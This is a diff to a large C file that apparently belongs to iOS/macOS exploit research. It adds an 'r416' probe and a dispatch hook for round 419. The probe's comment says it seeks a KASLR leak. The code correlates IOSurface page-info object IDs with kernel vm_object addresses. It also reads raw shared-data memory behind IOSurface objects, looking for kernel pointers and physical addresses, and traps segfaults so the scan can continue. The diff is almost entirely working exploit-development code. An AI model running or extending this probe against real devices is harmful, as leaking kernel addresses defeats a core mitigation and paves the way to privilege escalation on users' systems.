@@ -16479,6 +16479,343 @@ static void r410_probe(void) {
 }
 
 /*
+ * r416: Deep obj_id correlation + extended shared data scan.
+ *
+ * mach_vm_page_info flavor=1 returns 64-bit obj_id.
+ * If upper 32 bits correlate with kernel vm_object address,
+ * we have a KASLR leak. Also scan shared data >512 bytes
+ * for hidden kernel pointers.
+ */
+static volatile int g_r416_crashed = 0;
+static sigjmp_buf g_r416_jmp;
+static void r416_sighandler(int sig) {
+    g_r416_crashed = sig;
+    siglongjmp(g_r416_jmp, 1);
+}
+
+static void r416_probe(void) {
+    rlog("\n=== r416: Deep obj_id + Extended Shared Data ===\n\n");
+    fflush(stdout);
+
+    struct sigaction sa416, old_bus416, old_segv416;
+    memset(&sa416, 0, sizeof(sa416));
+    sa416.sa_handler = r416_sighandler;
+    sa416.sa_flags = 0;
+    sigaction(SIGBUS, &sa416, &old_bus416);
+    sigaction(SIGSEGV, &sa416, &old_segv416);
+
+    unsigned pixFmt = 'BGRA';
+    const void *keys[] = {
+        kIOSurfaceWidth, kIOSurfaceHeight,
+        kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+        kIOSurfaceAllocSize
+    };
+    int w = 64, h = 64, bpr = 256, as = 16384;
+    CFNumberRef vals[] = {
+        CFNumberCreate(NULL, kCFNumberIntType, &w),
+        CFNumberCreate(NULL, kCFNumberIntType, &h),
+        CFNumberCreate(NULL, kCFNumberIntType, &bpr),
+        CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+        CFNumberCreate(NULL, kCFNumberIntType, &as)
+    };
+    CFDictionaryRef props = CFDictionaryCreate(NULL, keys,
+        (const void**)vals, 5,
+        &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+
+    /* ---- Vector 1: 64-bit obj_id correlation across 50 surfaces ---- */
+    rlog("  Vector 1: 64-bit obj_id correlation (50 surfaces)\n");
+    {
+        #define R416_N 50
+        IOSurfaceRef surfs[R416_N];
+        uint64_t obj_ids[R416_N];
+        uint64_t base_addrs[R416_N];
+        uint32_t sids[R416_N];
+
+        for (int i = 0; i < R416_N; i++)
+            surfs[i] = IOSurfaceCreate(props);
+
+        for (int i = 0; i < R416_N; i++) {
+            IOSurfaceLock(surfs[i], 0, NULL);
+            base_addrs[i] = (uint64_t)IOSurfaceGetBaseAddress(surfs[i]);
+            IOSurfaceUnlock(surfs[i], 0, NULL);
+            sids[i] = IOSurfaceGetID(surfs[i]);
+
+            r415_page_info_t pinfo;
+            memset(&pinfo, 0, sizeof(pinfo));
+            mach_msg_type_number_t pcnt = (mach_msg_type_number_t)(sizeof(pinfo)/sizeof(int));
+            kern_return_t kr = mach_vm_page_info(mach_task_self(),
+                (mach_vm_address_t)base_addrs[i], 1, &pinfo, &pcnt);
+            obj_ids[i] = (kr == KERN_SUCCESS) ? pinfo.object_id : 0;
+        }
+
+        /* Print first 10 with full details */
+        rlog("    First 10:\n");
+        for (int i = 0; i < 10 && i < R416_N; i++) {
+            rlog("      [%d] sid=%u base=0x%llx obj_id=0x%016llx\n",
+                i, sids[i], (unsigned long long)base_addrs[i],
+                (unsigned long long)obj_ids[i]);
+        }
+
+        /* Analyze upper 32 bits pattern */
+        rlog("    Upper 32-bit analysis:\n");
+        uint32_t prevHi = 0;
+        for (int i = 0; i < R416_N; i++) {
+            uint32_t hi = (uint32_t)(obj_ids[i] >> 32);
+            if (i == 0) {
+                rlog("      [0] hi=0x%08x\n", hi);
+            } else if (hi != prevHi) {
+                int32_t delta = (int32_t)(hi - prevHi);
+                rlog("      [%d] hi=0x%08x delta=%d(0x%x)\n",
+                    i, hi, delta, (unsigned)delta);
+            }
+            prevHi = hi;
+        }
+
+        /* Check if obj_ids have constant stride */
+        rlog("    obj_id deltas (first 20):\n      ");
+        for (int i = 1; i < 20 && i < R416_N; i++) {
+            int64_t d = (int64_t)(obj_ids[i] - obj_ids[i-1]);
+            rlog(" %lld", (long long)d);
+        }
+        rlog("\n");
+
+        /* Check if lower 32 bits XOR with upper gives a pattern */
+        rlog("    lo^hi (first 10):");
+        for (int i = 0; i < 10 && i < R416_N; i++) {
+            uint32_t lo = (uint32_t)obj_ids[i];
+            uint32_t hi = (uint32_t)(obj_ids[i] >> 32);
+            rlog(" 0x%08x", lo ^ hi);
+        }
+        rlog("\n");
+
+        /* Check if base_addr delta correlates with obj_id delta */
+        rlog("    base_delta vs obj_id_delta (first 10):\n");
+        for (int i = 1; i < 10 && i < R416_N; i++) {
+            int64_t bd = (int64_t)(base_addrs[i] - base_addrs[i-1]);
+            int64_t od = (int64_t)(obj_ids[i] - obj_ids[i-1]);
+            rlog("      [%d] base_d=0x%llx obj_d=0x%llx ratio=%.2f\n",
+                i, (unsigned long long)bd, (unsigned long long)od,
+                od != 0 ? (double)bd / (double)od : 0.0);
+        }
+
+        for (int i = 0; i < R416_N; i++) CFRelease(surfs[i]);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 2: Extended shared data scan (2048 bytes) ---- */
+    rlog("\n  Vector 2: Extended shared data scan (2048 bytes)\n");
+    {
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        uint64_t shPtr = *(uint64_t*)((uint8_t*)surf + 8);
+
+        rlog("    Shared ptr: 0x%llx\n", (unsigned long long)shPtr);
+
+        g_r416_crashed = 0;
+        if (sigsetjmp(g_r416_jmp, 1) == 0) {
+            /* Scan for kernel-range pointers (0xfffffff0-0xffffffff) */
+            rlog("    Scanning for kernel-range values:\n");
+            int kernPtrCount = 0;
+            for (int off = 0; off < 2048; off += 8) {
+                uint64_t v = *(volatile uint64_t*)((uint8_t*)shPtr + off);
+                /* Check for kernel pointer range */
+                if ((v >> 32) >= 0xfffffff0ULL && (v >> 32) <= 0xffffffffULL) {
+                    rlog("      +%d: 0x%016llx (KERNEL RANGE!)\n",
+                        off, (unsigned long long)v);
+                    kernPtrCount++;
+                }
+                /* Check for TTBR/phys addr patterns */
+                if ((v >> 40) != 0 && (v >> 40) < 0x10 && (v & 0xFFF) == 0) {
+                    rlog("      +%d: 0x%016llx (possible phys addr)\n",
+                        off, (unsigned long long)v);
+                }
+            }
+            if (kernPtrCount == 0)
+                rlog("      (none found in 0-2047)\n");
+
+            /* Dump interesting non-zero values beyond +240 */
+            rlog("    Non-zero qwords beyond +240:\n");
+            int printed = 0;
+            for (int off = 240; off < 2048; off += 8) {
+                uint64_t v = *(volatile uint64_t*)((uint8_t*)shPtr + off);
+                if (v != 0 && printed < 30) {
+                    rlog("      +%d: 0x%016llx\n", off, (unsigned long long)v);
+                    printed++;
+                }
+            }
+            if (printed == 0) rlog("      (all zero)\n");
+        } else {
+            rlog("    CRASHED at some offset (sig=%d)\n", g_r416_crashed);
+        }
+        CFRelease(surf);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 3: Second surface shared data scan to identify per-surface fields ---- */
+    rlog("\n  Vector 3: Diff two surfaces' extended shared data\n");
+    {
+        IOSurfaceRef s1 = IOSurfaceCreate(props);
+        IOSurfaceRef s2 = IOSurfaceCreate(props);
+        uint64_t sh1 = *(uint64_t*)((uint8_t*)s1 + 8);
+        uint64_t sh2 = *(uint64_t*)((uint8_t*)s2 + 8);
+
+        g_r416_crashed = 0;
+        if (sigsetjmp(g_r416_jmp, 1) == 0) {
+            rlog("    Per-surface fields (differ between surfaces):\n");
+            int diffCount = 0;
+            int maxOff = 2048;
+            for (int off = 0; off < maxOff; off += 8) {
+                uint64_t v1 = *(volatile uint64_t*)((uint8_t*)sh1 + off);
+                uint64_t v2 = *(volatile uint64_t*)((uint8_t*)sh2 + off);
+                if (v1 != v2 && diffCount < 40) {
+                    uint64_t delta = v2 - v1;
+                    rlog("      +%d: 0x%016llx vs 0x%016llx (d=0x%llx)\n",
+                        off, (unsigned long long)v1,
+                        (unsigned long long)v2,
+                        (unsigned long long)delta);
+                    diffCount++;
+                }
+            }
+            rlog("    Total diffs: %d (scanned %d bytes)\n", diffCount, maxOff);
+        } else {
+            rlog("    CRASHED during scan (sig=%d)\n", g_r416_crashed);
+        }
+        CFRelease(s1);
+        CFRelease(s2);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 4: Try IOSurface with different alloc sizes to see if obj_id changes pattern ---- */
+    rlog("\n  Vector 4: obj_id vs alloc size\n");
+    {
+        int sizes[] = {4096, 16384, 65536, 262144, 1048576};
+        for (int si = 0; si < 5; si++) {
+            int sw = 64, sh = sizes[si] / 256, sbpr = 256, sas = sizes[si];
+            CFNumberRef sv[] = {
+                CFNumberCreate(NULL, kCFNumberIntType, &sw),
+                CFNumberCreate(NULL, kCFNumberIntType, &sh),
+                CFNumberCreate(NULL, kCFNumberIntType, &sbpr),
+                CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+                CFNumberCreate(NULL, kCFNumberIntType, &sas)
+            };
+            CFDictionaryRef sp = CFDictionaryCreate(NULL, keys,
+                (const void**)sv, 5,
+                &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+
+            IOSurfaceRef surf = IOSurfaceCreate(sp);
+            IOSurfaceLock(surf, 0, NULL);
+            void *b = IOSurfaceGetBaseAddress(surf);
+            IOSurfaceUnlock(surf, 0, NULL);
+
+            r415_page_info_t pinfo;
+            memset(&pinfo, 0, sizeof(pinfo));
+            mach_msg_type_number_t pcnt = (mach_msg_type_number_t)(sizeof(pinfo)/sizeof(int));
+            kern_return_t kr = mach_vm_page_info(mach_task_self(),
+                (mach_vm_address_t)b, 1, &pinfo, &pcnt);
+
+            rlog("    size=%dKB: obj_id=0x%016llx (kr=%d)\n",
+                sas/1024,
+                (unsigned long long)(kr == 0 ? pinfo.object_id : 0),
+                kr);
+
+            /* Also check page at different offsets within large surface */
+            if (sas >= 65536 && kr == 0) {
+                for (int poff = 16384; poff < sas && poff < 262144; poff += 16384) {
+                    r415_page_info_t pi2;
+                    memset(&pi2, 0, sizeof(pi2));
+                    mach_msg_type_number_t pc2 = (mach_msg_type_number_t)(sizeof(pi2)/sizeof(int));
+                    kern_return_t kr2 = mach_vm_page_info(mach_task_self(),
+                        (mach_vm_address_t)((uint8_t*)b + poff), 1, &pi2, &pc2);
+                    if (kr2 == 0 && pi2.object_id != pinfo.object_id) {
+                        rlog("      page+%d: obj_id=0x%016llx (DIFFERENT!)\n",
+                            poff, (unsigned long long)pi2.object_id);
+                    }
+                }
+                /* Check if all pages in same surface share obj_id */
+                rlog("      All pages same obj_id: ");
+                int same = 1;
+                for (int poff = 16384; poff < sas && poff < 262144; poff += 16384) {
+                    r415_page_info_t pi2;
+                    memset(&pi2, 0, sizeof(pi2));
+                    mach_msg_type_number_t pc2 = (mach_msg_type_number_t)(sizeof(pi2)/sizeof(int));
+                    mach_vm_page_info(mach_task_self(),
+                        (mach_vm_address_t)((uint8_t*)b + poff), 1, &pi2, &pc2);
+                    if (pi2.object_id != pinfo.object_id) { same = 0; break; }
+                }
+                rlog("%s\n", same ? "YES" : "NO");
+            }
+
+            CFRelease(surf);
+            CFRelease(sp);
+            for (int i = 0; i < 5; i++) CFRelease(sv[i]);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 5: obj_id for mmap'd anonymous memory vs IOSurface ---- */
+    rlog("\n  Vector 5: obj_id comparison (mmap vs IOSurface vs stack)\n");
+    {
+        uint64_t mmap_oid = 0, stack_oid = 0, ios_oid = 0;
+
+        /* Anonymous mmap */
+        void *anon = mmap(NULL, 16384, PROT_READ|PROT_WRITE,
+            MAP_PRIVATE|MAP_ANON, -1, 0);
+        *(volatile int*)anon = 42;
+        r415_page_info_t pinfo;
+        memset(&pinfo, 0, sizeof(pinfo));
+        mach_msg_type_number_t pcnt = (mach_msg_type_number_t)(sizeof(pinfo)/sizeof(int));
+        kern_return_t kr = mach_vm_page_info(mach_task_self(),
+            (mach_vm_address_t)anon, 1, &pinfo, &pcnt);
+        mmap_oid = (kr == 0) ? pinfo.object_id : 0;
+        rlog("    mmap anon: obj_id=0x%016llx (kr=%d)\n",
+            (unsigned long long)mmap_oid, kr);
+
+        /* Stack memory */
+        volatile char stackbuf[256];
+        stackbuf[0] = 'x';
+        memset(&pinfo, 0, sizeof(pinfo));
+        pcnt = (mach_msg_type_number_t)(sizeof(pinfo)/sizeof(int));
+        kr = mach_vm_page_info(mach_task_self(),
+            (mach_vm_address_t)((uintptr_t)stackbuf & ~0x3FFFULL), 1, &pinfo, &pcnt);
+        stack_oid = (kr == 0) ? pinfo.object_id : 0;
+        rlog("    stack:     obj_id=0x%016llx (kr=%d)\n",
+            (unsigned long long)stack_oid, kr);
+
+        /* IOSurface */
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        IOSurfaceLock(surf, 0, NULL);
+        void *b = IOSurfaceGetBaseAddress(surf);
+        IOSurfaceUnlock(surf, 0, NULL);
+        memset(&pinfo, 0, sizeof(pinfo));
+        pcnt = (mach_msg_type_number_t)(sizeof(pinfo)/sizeof(int));
+        kr = mach_vm_page_info(mach_task_self(),
+            (mach_vm_address_t)b, 1, &pinfo, &pcnt);
+        ios_oid = (kr == 0) ? pinfo.object_id : 0;
+        rlog("    iosurface: obj_id=0x%016llx (kr=%d)\n",
+            (unsigned long long)ios_oid, kr);
+
+        rlog("    Upper 32 bits: mmap=0x%08x stack=0x%08x iosurface=0x%08x\n",
+            (uint32_t)(mmap_oid >> 32),
+            (uint32_t)(stack_oid >> 32),
+            (uint32_t)(ios_oid >> 32));
+
+        munmap(anon, 16384);
+        CFRelease(surf);
+    }
+    fflush(stdout);
+
+    CFRelease(props);
+    for (int i = 0; i < 5; i++) CFRelease(vals[i]);
+
+    sigaction(SIGBUS, &old_bus416, NULL);
+    sigaction(SIGSEGV, &old_segv416, NULL);
+
+    rlog("\n=== r416 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r415: Metal GPU address correlation + IOSurface memory layout.
  *
  * Metal command buffers and shared memory may expose GPU-side physical
@@ -69559,6 +69896,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 419) {
+            rlog("*** rounds=419: Deep obj_id + Extended Shared Data ***\n");
+            rlog("  64-bit obj_id correlation, extended shared scan, alloc size test.\n\n");
+            fflush(stdout);
+            r416_probe();
+            goto done;
+        }
         if (rounds == 418) {
             rlog("*** rounds=418: Metal GPU + Memory Layout Probe ***\n");
             rlog("  vm_region_recurse, page info, ID patterns, shared data diff.\n\n");
@@ -72077,7 +72421,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
